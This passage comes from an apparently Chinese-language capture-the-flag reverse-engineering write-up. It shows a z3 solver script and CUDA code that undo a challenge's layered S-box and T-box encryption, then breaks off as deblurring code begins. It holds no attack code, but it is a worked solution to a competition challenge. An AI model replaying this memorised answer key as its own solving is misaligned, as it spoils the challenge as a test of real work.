class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>z3求解部分代码：</p><p>直接<code>python a.py num</code>这样运行，最后num是下标，这边一共将0x10000数据分为16块，也就是16个进程同时跑，所以运行脚本num得从0-15都一起运行，最后生成16份分块的解密数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sbox = [</span><br><span class="line">    <span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>,</span><br><span class="line">    <span class="number">0x1C</span>, <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>,</span><br><span class="line">    <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>,</span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>,</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>,</span><br><span class="line">    <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>,</span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>,</span><br><span class="line">    <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>,</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>,</span><br><span class="line">    <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span> </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">tbox = [</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x7C</span>, <span class="number">0x76</span>, <span class="number">0x7A</span>, <span class="number">0xF2</span>, <span class="number">0x6A</span>, <span class="number">0x6E</span>, <span class="number">0xC4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x2A</span>, <span class="number">0xFE</span>, <span class="number">0xD6</span>, <span class="number">0xAA</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC8</span>, <span class="number">0x7C</span>,</span><br><span class="line">    <span class="number">0xFA</span>, <span class="number">0x58</span>, <span class="number">0x46</span>, <span class="number">0xF0</span>, <span class="number">0xAC</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAE</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>,</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB6</span>, <span class="number">0xFC</span>, <span class="number">0x92</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3E</span>, <span class="number">0xF6</span>, <span class="number">0xCC</span>,</span><br><span class="line">    <span class="number">0x34</span>, <span class="number">0xA4</span>, <span class="number">0xE4</span>, <span class="number">0xF0</span>, <span class="number">0x70</span>, <span class="number">0xD8</span>, <span class="number">0x30</span>, <span class="number">0x14</span>, <span class="number">0x04</span>, <span class="number">0xC6</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xC2</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x04</span>, <span class="number">0x9A</span>, <span class="number">0x06</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>,</span><br><span class="line">    <span class="number">0xEA</span>, <span class="number">0x26</span>, <span class="number">0xB2</span>, <span class="number">0x74</span>, <span class="number">0x08</span>, <span class="number">0x82</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1A</span>, <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3A</span>, <span class="number">0xD6</span>, <span class="number">0xB2</span>, <span class="number">0x28</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0xD0</span>, <span class="number">0x00</span>, <span class="number">0xEC</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB0</span>, <span class="number">0x5A</span>, <span class="number">0x6A</span>, <span class="number">0xCA</span>,</span><br><span class="line">    <span class="number">0xBE</span>, <span class="number">0x38</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCE</span>, <span class="number">0xD0</span>, <span class="number">0xEE</span>, <span class="number">0xAA</span>, <span class="number">0xFA</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x4C</span>, <span class="number">0x32</span>, <span class="number">0x84</span>, <span class="number">0x44</span>, <span class="number">0xF8</span>, <span class="number">0x02</span>, <span class="number">0x7E</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0xA8</span>, <span class="number">0x50</span>, <span class="number">0xA2</span>, <span class="number">0x40</span>, <span class="number">0x8E</span>, <span class="number">0x92</span>, <span class="number">0x9C</span>, <span class="number">0x38</span>, <span class="number">0xF4</span>,</span><br><span class="line">    <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x20</span>, <span class="number">0x10</span>, <span class="number">0xFE</span>, <span class="number">0xF2</span>, <span class="number">0xD2</span>, <span class="number">0xCC</span>, <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">0x12</span>, <span class="number">0xEC</span>, <span class="number">0x5E</span>, <span class="number">0x96</span>, <span class="number">0x44</span>, <span class="number">0x16</span>, <span class="number">0xC4</span>, <span class="number">0xA6</span>, <span class="number">0x7E</span>, <span class="number">0x3C</span>,</span><br><span class="line">    <span class="number">0x64</span>, <span class="number">0x5C</span>, <span class="number">0x18</span>, <span class="number">0x72</span>, <span class="number">0x60</span>, <span class="number">0x80</span>, <span class="number">0x4E</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEF</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0A</span>, <span class="number">0xDA</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x48</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD2</span>,</span><br><span class="line">    <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x90</span>, <span class="number">0x94</span>, <span class="number">0xE4</span>, <span class="number">0x78</span>, <span class="number">0xE6</span>, <span class="number">0xC8</span>, <span class="number">0x36</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xD4</span>, <span class="number">0x4E</span>, <span class="number">0xA8</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x64</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x24</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>,</span><br><span class="line">    <span class="number">0xE8</span>, <span class="number">0xDC</span>, <span class="number">0x74</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0xBC</span>, <span class="number">0x8A</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>,</span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x02</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x60</span>, <span class="number">0x34</span>, <span class="number">0x56</span>, <span class="number">0xB8</span>,</span><br><span class="line">    <span class="number">0x86</span>, <span class="number">0xC0</span>, <span class="number">0x1C</span>, <span class="number">0x9E</span>, <span class="number">0xE0</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x10</span>, <span class="number">0x68</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9A</span>, <span class="number">0x1E</span>, <span class="number">0x86</span>, <span class="number">0xE8</span>, <span class="number">0xCE</span>, <span class="number">0x54</span>, <span class="number">0x28</span>, <span class="number">0xDE</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xA0</span>, <span class="number">0x88</span>, <span class="number">0x0C</span>, <span class="number">0xBE</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x40</span>, <span class="number">0x98</span>,</span><br><span class="line">    <span class="number">0x2C</span>, <span class="number">0x0E</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBA</span>, <span class="number">0x16</span> </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_input</span>(<span class="params">vArray,Size</span>):</span><br><span class="line">    s = Solver()</span><br><span class="line"></span><br><span class="line">    Input = [[BitVec(<span class="string">f&#x27;input_<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;j&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Size)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> bid <span class="keyword">in</span> <span class="built_in">range</span>(Size):</span><br><span class="line">        <span class="keyword">for</span> tid <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            tmp = sbox[tid]</span><br><span class="line">            <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                <span class="built_in">sum</span> += (tbox[tmp&amp;<span class="number">0xff</span>] * Input[bid][i])&amp;<span class="number">0xffff</span></span><br><span class="line">                tmp = (tmp*<span class="number">5</span>+<span class="number">17</span>)&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">            s.add(<span class="built_in">sum</span> == vArray[bid*<span class="number">256</span>+tid])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">        model = s.model()</span><br><span class="line">        result = [[model.evaluate(Input[i][j]).as_long() </span><br><span class="line">                  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)] </span><br><span class="line">                  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Size)]</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">num = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;Steg2&#x27;</span> , <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read(<span class="number">0x10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;Steg3_part&#x27;</span>+<span class="built_in">str</span>(num),<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> out_f:</span><br><span class="line">    start = num * <span class="number">16</span> * <span class="number">256</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Running...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        block = data[start + i * <span class="number">256</span> : start + i * <span class="number">256</span> + <span class="number">256</span> * <span class="number">1</span>]</span><br><span class="line">        In_ = [b <span class="keyword">for</span> b <span class="keyword">in</span> block]</span><br><span class="line">        </span><br><span class="line">        result = solve_input(In_, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            <span class="keyword">for</span> row <span class="keyword">in</span> result:</span><br><span class="line">                out_f.write(<span class="built_in">bytes</span>(row))</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Finished &#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27; block&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Finished all.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后Layer3前半部分解密+Layer2解密cuda代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">readFile</span><span class="params">(<span class="type">const</span> std::string&amp; filename, <span class="type">uint8_t</span>* buffer, <span class="type">size_t</span> startPos, <span class="type">size_t</span> bufferSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">std::ifstream <span class="title">file</span><span class="params">(filename, std::ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!file.<span class="built_in">is_open</span>()) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">seekg</span>(startPos);</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">read</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(buffer), bufferSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">writeToFile</span><span class="params">(<span class="type">const</span> std::string&amp; filename, <span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">std::ofstream <span class="title">file</span><span class="params">(filename, std::ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!file.<span class="built_in">is_open</span>()) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">write</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data), size);</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        invSbox[sbox[i]] = i;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* Input = <span class="keyword">new</span> <span class="type">uint8_t</span>[<span class="number">256</span> * <span class="number">256</span>];</span><br><span class="line">    <span class="comment">// 读取16块解密数据合并</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">readFile</span>(<span class="string">&quot;Steg3_part&quot;</span> + std::<span class="built_in">to_string</span>(i),Input + i * <span class="number">16</span> * <span class="number">256</span>, <span class="number">0</span>, <span class="number">0x10000</span> / <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_sbox, sbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_tbox, tbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_invsbox, invSbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="type">uint8_t</span>* InPtr&#123;&#125;, * OutPtr&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;InPtr, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;OutPtr, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(InPtr, Input, <span class="number">0x10000</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line">    <span class="function">dim3 <span class="title">Blocks</span><span class="params">(<span class="number">256</span>, <span class="number">1</span>, <span class="number">1</span>)</span>, <span class="title">Threads</span><span class="params">(<span class="number">256</span>, <span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">    Re_Layer3_part2 &lt;&lt; &lt;Blocks, Threads &gt;&gt; &gt; (InPtr, OutPtr);</span><br><span class="line">    <span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line"></span><br><span class="line">    Re_Layer2 &lt;&lt; &lt;Blocks, Threads &gt;&gt; &gt; (OutPtr, InPtr);</span><br><span class="line">    <span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(Input, InPtr, <span class="number">0x10000</span>, cudaMemcpyDeviceToHost);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">writeToFile</span>(<span class="string">&quot;Layer2_Decrypted&quot;</span>, Input, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaFree</span>(InPtr);</span><br><span class="line">    <span class="built_in">cudaFree</span>(OutPtr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] Input;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后得到Layer1加密后的图片，是经过动态模糊卷积后的，不可完全逆向，只能用算法进行清晰化处理。</p><p><img src="/2025/04/27/ACTF-Deeptx/image-2.png" alt="alt text"></p><p>去模糊代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 